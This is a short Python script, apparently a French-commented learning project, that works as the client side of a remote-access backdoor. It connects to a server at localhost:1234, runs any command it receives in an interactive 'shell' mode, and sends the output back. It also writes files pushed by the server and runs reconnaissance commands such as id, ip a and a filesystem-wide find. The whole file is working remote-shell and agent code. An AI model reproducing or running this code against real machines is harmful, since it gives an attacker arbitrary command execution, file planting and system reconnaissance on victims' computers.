import socket
import subprocess

def recv_all(sock, length):
    data = b''
    while len(data) < length:
        more = sock.recv(length - len(data))
        if not more:
            raise EOFError('Expected %d bytes but only received %d bytes before the socket closed' % (length, len(data)))
        data += more
    return data

def connect_to_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('localhost', 1234))

    while True:
        command = s.recv(1024).decode('utf-8')
        if command.lower() == "exit":
            break

        if command.lower() == "shell":
            while True:
                command = s.recv(1024).decode('utf-8')
                if command.lower() == "exit":
                    break
                output = subprocess.getoutput(command)
                s.send(output.encode('utf-8'))

        if command.lower().startswith("upload"):
            file_path = command.split(" ")[1]
            filename = file_path.split("/")[-1]
            print(f"Downloading {filename}...")

            # Recevoir la taille du fichier (8 octets)
            file_size = int.from_bytes(s.recv(8), 'big')
            print(f"Expected file size: {file_size} bytes")

            # Recevoir le fichier en morceaux de 1024 octets
            with open(filename, "wb") as file:
                received = 0
                while received < file_size:
                    chunk = s.recv(min(1024, file_size - received))
                    if not chunk:
                        raise EOFError('Connection closed before receiving all the data')
                    file.write(chunk)
                    received += len(chunk)

            print("File uploaded successfully")
            s.send(b"File uploaded successfully")

        if command.lower() == "getuid":
            output = subprocess.getoutput("id")
            s.send(output.encode('utf-8'))

        if command.lower() == "ipconfig":
            output = subprocess.getoutput("ip a")
            s.send(output.encode('utf-8'))

        if command.lower() == "ls":
            output = subprocess.getoutput("ls")
            s.send(output.encode('utf-8'))

        if command.lower() == "pwd":
            output = subprocess.getoutput("pwd")
            s.send(output.encode('utf-8'))

        if command.lower().startswith("search"):
            searched_file = command.split(" ")[1]
            print(f"Searching for {searched_file}...")
            output = subprocess.getoutput(f"find / -name {searched_file} 2>/dev/null")
            s.send(output.encode('utf-8'))

    s.close()

if __name__ == "__main__":
    connect_to_server()
